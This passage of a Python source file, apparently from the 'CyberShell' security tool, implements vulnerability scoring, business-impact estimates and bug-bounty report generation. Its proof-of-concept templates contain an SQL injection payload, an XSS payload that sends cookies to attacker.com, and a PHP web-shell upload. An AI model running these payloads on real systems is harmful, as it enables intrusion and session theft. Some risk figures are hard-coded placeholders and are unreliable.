        """Generate prioritized recommendations"""
        
        recommendations = []
        
        critical_findings = [f for f in findings if f.severity == 'Critical']
        if critical_findings:
            recommendations.append({
                'priority': 'IMMEDIATE',
                'title': 'Address Critical Vulnerabilities',
                'description': f'Immediately remediate {len(critical_findings)} critical vulnerabilities',
                'impact': 'Prevent potential data breach and regulatory violations',
                'effort': 'High',
                'timeline': '0-48 hours'
            })
        
        if len(findings) > 10:
            recommendations.append({
                'priority': 'HIGH',
                'title': 'Implement Continuous Security Testing',
                'description': 'Deploy automated security testing in CI/CD pipeline',
                'impact': 'Reduce vulnerability introduction by 70%',
                'effort': 'Medium',
                'timeline': '2-4 weeks'
            })
        
        return sorted(recommendations, key=lambda x: {'IMMEDIATE': 0, 'HIGH': 1, 'MEDIUM': 2}.get(x['priority'], 3))
    
    def _save_html_report(self, report: Dict):
        """Save report as HTML"""
        
        html_template = Template("""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Assessment Report - {{ metadata.report_id }}</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                h1 { color: #1976d2; }
                h2 { color: #424242; border-bottom: 2px solid #e0e0e0; padding-bottom: 10px; }
                .critical { color: #d32f2f; font-weight: bold; }
                .high { color: #f57c00; font-weight: bold; }
                .metric { display: inline-block; margin: 10px; padding: 15px; background: #f5f5f5; border-radius: 5px; }
                .chart { margin: 20px 0; }
                table { border-collapse: collapse; width: 100%; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
                th { background-color: #1976d2; color: white; }
            </style>
        </head>
        <body>
            <h1>Executive Security Assessment Report</h1>
            <div class="metadata">
                <p><strong>Report ID:</strong> {{ metadata.report_id }}</p>
                <p><strong>Generated:</strong> {{ metadata.generated_at }}</p>
                <p><strong>Target:</strong> {{ metadata.target }}</p>
            </div>
            
            <h2>Executive Summary</h2>
            <div class="metrics">
                <div class="metric">
                    <strong>Total Vulnerabilities:</strong> {{ executive_summary.total_vulnerabilities }}
                </div>
                <div class="metric critical">
                    <strong>Critical:</strong> {{ executive_summary.critical_findings }}
                </div>
                <div class="metric high">
                    <strong>High:</strong> {{ executive_summary.high_findings }}
                </div>
            </div>
            
            <h2>Financial Impact</h2>
            <table>
                <tr><th>Impact Type</th><th>Amount (USD)</th></tr>
                <tr><td>Potential Breach Cost</td><td>${{ "{:,.2f}".format(financial_impact.potential_breach_cost) }}</td></tr>
                <tr><td>Remediation Cost</td><td>${{ "{:,.2f}".format(financial_impact.remediation_cost) }}</td></tr>
                <tr><td>Total Potential Loss</td><td><strong>${{ "{:,.2f}".format(financial_impact.total_potential_loss) }}</strong></td></tr>
            </table>
            
            <h2>Risk Assessment</h2>
            <div class="chart">
                <img src="{{ visualizations.risk_heatmap }}" alt="Risk Heatmap" style="max-width: 100%;">
            </div>
        </body>
        </html>
        """)
        
        html_content = html_template.render(**report)
        
        report_path = self.report_dir / f"report_{report['metadata']['report_id']}.html"
        with open(report_path, 'w') as f:
            f.write(html_content)
    
    def _save_json_report(self, report: Dict):
        """Save report as JSON"""
        report_path = self.report_dir / f"report_{report['metadata']['report_id']}.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2, default=str)
    
    # Helper methods
    def _calculate_risk_level(self, score: float) -> str:
        if score > 8: return 'Critical'
        if score > 6: return 'High'
        if score > 4: return 'Medium'
        return 'Low'
    
    def _score_to_level(self, score: float) -> str:
        if score >= 8: return 'Critical'
        if score >= 6: return 'High'
        if score >= 4: return 'Medium'
        return 'Low'
    
    def _identify_key_risks(self, findings: List[VulnerabilityFinding]) -> List[str]:
        risks = []
        if any(f.severity == 'Critical' for f in findings):
            risks.append('Critical vulnerabilities requiring immediate attention')
        if any('customer_data' in f.affected_assets for f in findings):
            risks.append('Customer data at risk')
        return risks
    
    def _generate_executive_recommendation(self, findings: List[VulnerabilityFinding]) -> str:
        critical_count = sum(1 for f in findings if f.severity == 'Critical')
        if critical_count > 0:
            return 'IMMEDIATE ACTION REQUIRED: Critical vulnerabilities pose immediate threat'
        return 'SCHEDULED REMEDIATION: Vulnerabilities should be addressed in next maintenance cycle'
    
    def _calculate_technical_risk(self, findings: List[VulnerabilityFinding]) -> float:
        if not findings: return 0
        return min(10, np.mean([f.cvss_score for f in findings]) * 1.2)
    
    def _calculate_business_risk(self, findings: List[VulnerabilityFinding]) -> float:
        if not findings: return 0
        critical_systems = sum(1 for f in findings if any('critical' in asset.lower() for asset in f.affected_assets))
        return min(10, (critical_systems / len(findings)) * 10)
    
    def _calculate_compliance_risk(self, findings: List[VulnerabilityFinding]) -> float:
        if not findings: return 0
        compliance_violations = sum(len(f.compliance_implications) for f in findings)
        return min(10, compliance_violations * 2)
    
    def _calculate_reputation_risk(self, findings: List[VulnerabilityFinding]) -> float:
        if not findings: return 0
        public_facing = sum(1 for f in findings if any('public' in asset.lower() for asset in f.affected_assets))
        return min(10, (public_facing / len(findings)) * 10 * self.company_profile['reputation_multiplier'])
    
    def _calculate_operational_risk(self, findings: List[VulnerabilityFinding]) -> float:
        if not findings: return 0
        business_functions = set()
        for f in findings:
            business_functions.update(f.business_functions_affected)
        return min(10, len(business_functions) * 2)
    
    def _calculate_risk_trend(self) -> str:
        return 'Increasing'  # Placeholder
    
    def _prioritize_mitigations(self, findings: List[VulnerabilityFinding]) -> List[str]:
        sorted_findings = sorted(findings, 
                                key=lambda x: (x.cvss_score * x.confidence_score), 
                                reverse=True)
        return [f.vulnerability_type for f in sorted_findings[:5]]
    
    def _calculate_compliance_fines(self, findings: List[VulnerabilityFinding]) -> float:
        fines = 0
        for f in findings:
            if 'GDPR' in f.compliance_implications:
                fines += 20_000_000 * 0.01
            if 'PCI-DSS' in f.compliance_implications:
                fines += 500_000 * 0.05
        return fines
    
    def _calculate_disruption_cost(self, findings: List[VulnerabilityFinding]) -> float:
        disruption_hours = sum(f.time_to_exploit * 24 for f in findings if f.severity in ['Critical', 'High'])
        hourly_cost = self.company_profile['annual_revenue'] / (365 * 24)
        return disruption_hours * hourly_cost
    
    def _calculate_insurance_impact(self, total_loss: float) -> str:
        if total_loss > 10_000_000:
            return 'Premium increase likely (15-30%)'
        return 'Minimal impact on premiums'
    
    def _calculate_risk_reduction(self) -> float:
        return 75.0
    
    def _check_compliance_violations(self, findings: List[VulnerabilityFinding], framework: str) -> List[str]:
        violations = []
        for f in findings:
            if framework in f.compliance_implications:
                violations.append(f.vulnerability_type)
        return violations
    
    def _check_certification_risk(self, violations: Dict) -> bool:
        return any(len(v) > 3 for v in violations.values())
    
    def _calculate_compliance_deadline(self, violations: Dict) -> str:
        if any(violations.values()):
            return '30 days for critical violations'
        return 'Next audit cycle'
    
    def _format_remediation_items(self, findings: List[VulnerabilityFinding]) -> List[Dict]:
        items = []
        for f in findings:
            items.append({
                'vulnerability': f.vulnerability_type,
                'severity': f.severity,
                'complexity': f.fix_complexity,
                'effort_hours': self.REMEDIATION_TIME[f.fix_complexity],
                'affected_assets': f.affected_assets[:3]
            })
        return items
    
    def _calculate_team_size(self, findings: List[VulnerabilityFinding]) -> int:
        total_hours = sum(self.REMEDIATION_TIME[f.fix_complexity] for f in findings)
        return max(1, int(total_hours / 80))
    
    def _generate_milestones(self, findings: List[VulnerabilityFinding]) -> List[Dict]:
        milestones = [
            {
                'week': 1,
                'target': 'Complete critical vulnerability remediation',
                'success_criteria': 'All critical vulnerabilities patched and verified'
            },
            {
                'week': 2,
                'target': 'Address high-priority vulnerabilities',
                'success_criteria': '80% of high vulnerabilities remediated'
            }
        ]
        return milestones
    
    def _generate_technical_appendix(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Generate technical details appendix"""
        return {
            'detailed_findings': [self._format_technical_finding(f) for f in findings],
            'exploitation_chains': self._identify_exploitation_chains(findings),
            'attack_vectors': self._categorize_attack_vectors(findings),
            'technical_recommendations': self._generate_technical_recommendations(findings)
        }
    
    def _format_technical_finding(self, finding: VulnerabilityFinding) -> Dict:
        return {
            'type': finding.vulnerability_type,
            'cvss': finding.cvss_score,
            'evidence': finding.evidence,
            'affected': finding.affected_assets,
            'remediation': finding.remediation
        }
    
    def _identify_exploitation_chains(self, findings: List[VulnerabilityFinding]) -> List[List[str]]:
        chains = []
        for i, f1 in enumerate(findings):
            for f2 in findings[i+1:]:
                if self._can_chain(f1, f2):
                    chains.append([f1.vulnerability_type, f2.vulnerability_type])
        return chains
    
    def _can_chain(self, f1: VulnerabilityFinding, f2: VulnerabilityFinding) -> bool:
        chainable_pairs = [
            ('XSS', 'CSRF'),
            ('SQLI', 'RCE'),
            ('LFI', 'RCE'),
            ('SSRF', 'RCE')
        ]
        return (f1.vulnerability_type, f2.vulnerability_type) in chainable_pairs
    
    def _categorize_attack_vectors(self, findings: List[VulnerabilityFinding]) -> Dict[str, List[str]]:
        vectors = {
            'Network': [],
            'Application': [],
            'Physical': [],
            'Social': []
        }
        
        for f in findings:
            if f.vulnerability_type in ['RCE', 'SSRF']:
                vectors['Network'].append(f.vulnerability_type)
            elif f.vulnerability_type in ['XSS', 'SQLI', 'CSRF']:
                vectors['Application'].append(f.vulnerability_type)
        
        return vectors
    
    def _generate_technical_recommendations(self, findings: List[VulnerabilityFinding]) -> List[str]:
        recommendations = set()
        
        for f in findings:
            if f.vulnerability_type == 'SQLI':
                recommendations.add('Implement parameterized queries and input validation')
            elif f.vulnerability_type == 'XSS':
                recommendations.add('Deploy Content Security Policy (CSP) headers')
        
        return list(recommendations)


# ============================================================================
# DASHBOARD REPORTER (from dashboard/components/reports.py)
# ============================================================================

class DashboardReporter:
    """Generate reports from dashboard data"""
    
    @staticmethod
    def generate_json_report(data: Dict) -> str:
        """Generate JSON report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'data': data
        }
        return json.dumps(report, indent=2)
    
    @staticmethod
    def generate_markdown_report(data: Dict) -> str:
        """Generate Markdown report"""
        md = f"# CyberShell Report\n\n"
        md += f"Generated: {datetime.now()}\n\n"
        
        if 'vulnerabilities' in data:
            md += "## Vulnerabilities Found\n\n"
            for vuln in data['vulnerabilities']:
                md += f"- {vuln}\n"
        
        return md


# ============================================================================
# UNIFIED REPORTING SYSTEM
# ============================================================================

class UnifiedReportingSystem:
    """Unified reporting system combining all report types"""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        
        # Initialize all reporters
        self.bug_bounty_reporter = BugBountyReporter()
        self.business_impact_reporter = BusinessImpactReporter(
            self.config.get('company_profile')
        )
        self.dashboard_reporter = DashboardReporter()
        
        # Initialize scorers
        self.scorers = {
            'default': DefaultScorer(),
            'weighted_signal': WeightedSignalScorer(),
            'high_confidence': HighConfidenceScorer(),
            'bounty_value': BountyValueScorer(),
            'combined': CombinedScorer()
        }
        self.active_scorer = 'combined'
        
        # Evidence aggregator for tracking
        self.evidence_aggregator = EvidenceAggregator()
        
        # Report output directory
        self.output_dir = Path(self.config.get('output_dir', 'reports'))
        self.output_dir.mkdir(exist_ok=True)
    
    def score_result(self, result: PluginResult) -> float:
        """Score a plugin result using active scorer"""
        scorer = self.scorers.get(self.active_scorer, self.scorers['default'])
        score = scorer.score(result)
        
        # Track in aggregator
        self.evidence_aggregator.add(score, {'plugin_name': result.name})
        
        return score
    
    def create_vulnerability_finding(self, vuln_type: str, evidence: Dict[str, Any],
                                   target: str) -> VulnerabilityFinding:
        """Create unified vulnerability finding"""
        
        vuln_db = self.bug_bounty_reporter.vulnerability_db
        vuln_info = vuln_db.get(vuln_type, {})
        
        # Calculate scores
        result = PluginResult(vuln_type, True, evidence)
        evidence_score = self.score_result(result)
        
        cvss_score = evidence.get('cvss_score', vuln_info.get('base_cvss', 5.0))
        severity = self._cvss_to_severity(cvss_score)
        
        # Generate PoC
        poc = self._generate_poc(vuln_type, evidence, target)
        
        # Generate steps
        steps = self._generate_steps(vuln_type, target)
        
        return VulnerabilityFinding(
            vulnerability_type=vuln_type,
            title=f"{vuln_info.get('title', vuln_type.upper())} in {target}",
            severity=severity,
            cvss_score=cvss_score,
            evidence_score=evidence_score,
            confidence_score=evidence.get('confidence', evidence_score),
            cwe_id=vuln_info.get('cwe', 'CWE-Unknown'),
            description=vuln_info.get('description', f'{vuln_type} vulnerability found'),
            impact=self._generate_impact_description(vuln_type, evidence),
            steps_to_reproduce=steps,
            proof_of_concept=poc,
            evidence=evidence,
            remediation=vuln_info.get('remediation', 'Implement security best practices'),
            references=[
                f"https://cwe.mitre.org/data/definitions/{vuln_info.get('cwe', '').replace('CWE-', '')}.html"
            ],
            affected_assets=evidence.get('affected_assets', [target]),
            exploitation_proof=evidence,
            fix_complexity=evidence.get('fix_complexity', 'Moderate'),
            time_to_exploit=evidence.get('time_to_exploit', 1.0)
        )
    
    def generate_report(self, target: str, findings: List[VulnerabilityFinding],
                       scan_metadata: Dict, report_type: str = 'combined') -> Dict:
        """
        Generate report based on type
        
        Types:
        - 'bug_bounty': Bug bounty focused report
        - 'business_impact': Executive business impact report
        - 'dashboard': Simple dashboard report
        - 'combined': All report types
        """
        
        reports = {}
        
        if report_type in ['bug_bounty', 'combined']:
            # Generate bug bounty report
            bb_report = self.bug_bounty_reporter.build(
                target=target,
                recon=scan_metadata.get('recon', {}),
                findings=findings
            )
            reports['bug_bounty'] = bb_report
            
            # Save to file
            self._save_report(bb_report, 'bug_bounty', 'md')
        
        if report_type in ['business_impact', 'combined']:
            # Generate business impact report
            bi_report = self.business_impact_reporter.generate_executive_report(
                findings=findings,
                scan_metadata=scan_metadata
            )
            reports['business_impact'] = bi_report
        
        if report_type in ['dashboard', 'combined']:
            # Generate dashboard report
            dashboard_data = {
                'target': target,
                'vulnerabilities': [f.vulnerability_type for f in findings],
                'severity_distribution': self._get_severity_distribution(findings),
                'evidence_scores': self.evidence_aggregator.get_statistics()
            }
            reports['dashboard'] = {
                'json': self.dashboard_reporter.generate_json_report(dashboard_data),
                'markdown': self.dashboard_reporter.generate_markdown_report(dashboard_data)
            }
        
        # Add summary
        reports['summary'] = self._generate_summary(findings, scan_metadata)
        
        return reports
    
    def get_evidence_statistics(self) -> Dict[str, Any]:
        """Get evidence aggregator statistics"""
        return self.evidence_aggregator.get_statistics()
    
    def should_pivot_strategy(self) -> bool:
        """Check if exploitation strategy should pivot"""
        return self.evidence_aggregator.should_pivot()
    
    def set_scorer(self, scorer_name: str):
        """Set active scoring strategy"""
        if scorer_name in self.scorers:
            self.active_scorer = scorer_name
    
    def get_high_value_targets(self, findings: List[VulnerabilityFinding],
                             min_bounty: int = 1000) -> List[VulnerabilityFinding]:
        """Get findings with high bounty value"""
        bounty_scorer = BountyValueScorer()
        high_value = []
        
        for finding in findings:
            result = PluginResult(
                finding.vulnerability_type,
                True,
                {'severity': finding.severity, 'evidence': finding.evidence}
            )
            
            if bounty_scorer.get_estimated_bounty(result) >= min_bounty:
                high_value.append(finding)
        
        return high_value
    
    def _save_report(self, report: str, report_type: str, format: str):
        """Save report to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = self.output_dir / f"{report_type}_report_{timestamp}.{format}"
        
        with open(filename, 'w') as f:
            f.write(report)
        
        return filename
    
    def _cvss_to_severity(self, cvss: float) -> str:
        """Convert CVSS score to severity rating"""
        if cvss >= 9.0:
            return 'Critical'
        elif cvss >= 7.0:
            return 'High'
        elif cvss >= 4.0:
            return 'Medium'
        elif cvss >= 0.1:
            return 'Low'
        return 'Info'
    
    def _generate_poc(self, vuln_type: str, evidence: Dict[str, Any], target: str) -> str:
        """Generate proof of concept code"""
        poc_templates = {
            'sqli': f"""
# SQL Injection PoC
import requests

url = "{target}"
payload = "' OR '1'='1' UNION SELECT NULL, database(), NULL--"
params = {{"id": payload}}

response = requests.get(url, params=params)
print("Database:", response.text)
""",
            'xss': f"""
# XSS PoC
payload = '<img src=x onerror="fetch(`https://attacker.com?c=${{document.cookie}}`)">'
url = "{target}?search=" + payload
""",
            'rce': f"""
# RCE PoC
import requests

url = "{target}/upload"
shell = "<?php system($_GET['cmd']); ?>"
files = {{"file": ("shell.php", shell, "application/x-php")}}
response = requests.post(url, files=files)
"""
        }
        
        return poc_templates.get(vuln_type, f"# {vuln_type.upper()} PoC\n# Evidence: {json.dumps(evidence, indent=2)}")
    
    def _generate_steps(self, vuln_type: str, target: str) -> List[str]:
        """Generate steps to reproduce"""
        steps_templates = {
            'sqli': [
                f"Navigate to {target}",
                "Locate the vulnerable parameter (e.g., 'id')",
                "Insert SQL injection payload: ' OR '1'='1",
                "Observe database error or data leakage",
                "Use UNION SELECT to extract data"
            ],
            'xss': [
                f"Navigate to {target}",
                "Locate input field or parameter",
                "Insert XSS payload: <script>alert(1)</script>",
                "Submit the form or navigate to crafted URL",
                "Observe JavaScript execution"
            ],
            'rce': [
                f"Navigate to {target}",
                "Identify command injection point",
                "Insert command injection payload: ; whoami",
                "Submit the request",
                "Observe command execution output"
            ]
        }
        
        return steps_templates.get(vuln_type, [f"Test {vuln_type} on {target}"])
    
    def _generate_impact_description(self, vuln_type: str, evidence: Dict[str, Any]) -> str:
        """Generate impact description"""
        impact_templates = {
            'sqli': "Allows extraction of entire database including sensitive user data.",
            'xss': "Enables session hijacking and account takeover.",
            'rce': "Provides complete system compromise.",
            'idor': "Allows unauthorized access to other users' data.",
            'ssrf': "Enables access to internal network resources."
        }
        
        base_impact = impact_templates.get(vuln_type, f"{vuln_type} vulnerability with security impact")
        
        if evidence.get('data'):
            base_impact += f" Successfully extracted data."
        
        if evidence.get('admin_access'):
            base_impact += " Achieved administrative access."
        
        return base_impact
    
    def _get_severity_distribution(self, findings: List[VulnerabilityFinding]) -> Dict[str, int]:
        """Get severity distribution of findings"""
        distribution = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        
        for finding in findings:
            if finding.severity in distribution:
                distribution[finding.severity] += 1
        
        return distribution
    
    def _generate_summary(self, findings: List[VulnerabilityFinding], scan_metadata: Dict) -> Dict:
        """Generate comprehensive summary"""
        return {
            'scan_duration': scan_metadata.get('duration', 0),
            'target': scan_metadata.get('target', 'Unknown'),
            'total_findings': len(findings),
            'critical_findings': sum(1 for f in findings if f.severity == 'Critical'),
            'high_findings': sum(1 for f in findings if f.severity == 'High'),
            'evidence_trend': self.evidence_aggregator.get_trend(),
            'average_evidence_score': self.evidence_aggregator.get_ema(),
            'max_evidence_score': self.evidence_aggregator.get_max(),
            'estimated_total_bounty': sum(
                BountyValueScorer().get_estimated_bounty(
                    PluginResult(f.vulnerability_type, True, {'severity': f.severity})
                ) for f in findings
            )
        }


# Scorer registry
SCORER_REGISTRY: Dict[str, BaseScorer] = {
    'default': DefaultScorer(),
    'weighted_signal': WeightedSignalScorer(),
    'high_confidence': HighConfidenceScorer(),
    'bounty_value': BountyValueScorer(),
    'combined': CombinedScorer()
}

def get_scorer(name: str) -> BaseScorer:
    """Get scorer by name"""
    return SCORER_REGISTRY.get(name, SCORER_REGISTRY['default'])

def register_scorer(name: str, scorer: BaseScorer):
    """Register a custom scorer"""
    SCORER_REGISTRY[name] = scorer


# For backward compatibility
ReportBuilder = BugBountyReporter  # Alias
VulnerabilityReport = VulnerabilityFinding  # Alias
ReportGenerator = DashboardReporter  # Alias

__all__ = [
    'UnifiedReportingSystem',
    'VulnerabilityFinding',
    'BugBountyReporter',
    'BusinessImpactReporter',
    'DashboardReporter',
    'BaseScorer',
    'DefaultScorer',
    'WeightedSignalScorer',
    'HighConfidenceScorer',
    'BountyValueScorer',
    'CombinedScorer',
    'EvidenceAggregator',
    'get_scorer',
    'register_scorer',
    'PluginResult'
]
